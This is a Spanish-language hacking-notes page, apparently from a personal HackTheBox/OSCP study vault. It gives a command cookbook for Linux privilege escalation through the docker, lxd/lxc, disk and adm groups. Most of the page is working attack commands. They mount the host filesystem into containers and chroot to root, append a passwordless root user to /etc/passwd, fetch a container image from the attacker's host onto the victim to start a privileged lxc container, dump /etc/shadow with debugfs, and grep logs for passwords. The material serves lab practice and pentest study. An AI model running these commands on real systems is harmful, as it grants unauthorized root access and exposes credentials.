# Técnica: docker group

[[00-inicio|Inicio]] · [[Entorno|Entorno]] · [[Puertos|Puertos]] · [[Servicios|Servicios]] · [[Tecnicas|Tecnicas]] · [[Maquinas|Maquinas]] · [[Referencias|Referencias]]

**10 máquina(s)** mencionan esta técnica.

> Esta técnica tiene **recetario de comandos**. Está más abajo, después de la lista de máquinas.

## Comandos

> **Placeholders**: `<IP>` · `<TU_IP>`

### Detectar

```bash
id
groups
```

Si aparecés en el grupo **`docker`**, `lxd`/`lxc`, `disk`, `adm` o `video`, tenés
escalada casi garantizada. El grupo `docker` es el más común en labs.

| Grupo | Cómo da root |
| --- | --- |
| `docker` | Montás `/` del host dentro de un contenedor |
| `lxd` / `lxc` | Contenedor privilegiado con el host montado |
| `disk` | Escribís el disco crudo |
| `adm` | Leés logs en `/var/log` (credenciales filtradas) |
| `video` | Leés el framebuffer (capturas de pantalla) |

### `docker` — la escalada más limpia

El truco: si podés correr contenedores, podés **montar el filesystem del host**.

```bash
# ¿Hay imágenes ya presentes? (evita necesitar red)
docker images

# Opción 1: montar / del host y hacer chroot
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

```bash
# Opción 2: con una imagen que ya esté en el host
docker run -v /:/host --rm -it <imagen_existente> /bin/sh
# Y adentro:  chroot /host /bin/bash
```

```bash
# Opción 3: sin chroot, escribiendo directo en el host
docker run -v /:/mnt --rm -it alpine sh -c 'echo "pwned::0:0:root:/root:/bin/bash" >> /mnt/etc/passwd'
# Y después, en el host:  su pwned
```

Si no hay imágenes y **no** tenés internet, no podés bajar una. Pero podés
construir una mínima si tenés acceso a un Dockerfile, o usar
`docker run -v /:/mnt --rm -it <cualquier_imagen_existente>`.

### Ver si hay socket de Docker accesible

Un caso relacionado y muy frecuente: el socket `docker.sock` con permisos
demasiado abiertos.

```bash
ls -la /var/run/docker.sock
# Si es accesible por tu usuario, podés usar la API directamente
curl --unix-socket /var/run/docker.sock http://localhost/version
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

### `lxd` / `lxc`

```bash
# En tu Kali: preparar una imagen mínima y servirla
# (necesitás una imagen alpine rootfs; hay que bajarla de imágenes oficiales)
python3 -m http.server 8000
```

```bash
# En la víctima
wget http://<TU_IP>:8000/alpine.tar.gz -O /tmp/alpine.tar.gz

lxc image import /tmp/alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
# Y adentro:  cd /mnt/root && chroot . /bin/bash
```

### `disk`

```bash
df -h                    # identificar el disco
debugfs /dev/sda1        # escribir en el filesystem directo
# Adentro de debugfs:
#   ls /root
#   dump /etc/shadow /tmp/shadow
```

### `adm`

```bash
# Los logs suelen tener credenciales, URLs con tokens, y comandos con contraseñas
grep -riE "passw|password" /var/log/ 2>/dev/null | head -20
ls -la /var/log/
```

### Si NO estás en ningún grupo especial

No te claves acá. Volvé al orden completo en [[LPE-Linux]].

## Referencias

- [HackTricks](https://book.hacktricks.wiki/)

---

## Máquinas

- [[htb-kobold\|Kobold]] — 3 mención(es) · Linux · Easy
- [[htb-olympus\|Olympus]] — 2 mención(es) · Linux · Medium
- [[htb-ariekei\|Ariekei]] — 1 mención(es) · Linux · Insane
- [[htb-cache\|Cache]] — 1 mención(es) · Linux · Medium
- [[htb-feline\|Feline]] — 1 mención(es) · Linux · Hard
- [[htb-laboratory\|Laboratory]] — 1 mención(es) · Linux · Easy
- [[htb-mischief\|Mischief]] — 1 mención(es) · Linux · Insane
- [[htb-oz\|Oz]] — 1 mención(es) · Linux · Hard
- [[htb-runner\|Runner]] — 1 mención(es) · Linux · Medium
- [[htb-shoppy\|Shoppy]] — 1 mención(es) · Linux · Easy

## Cómo ver el contexto

```bash
python3 _sistema/herramientas/buscar.py 'docker group' -v
python3 _sistema/herramientas/buscar.py 'docker group' -v --oscp
```
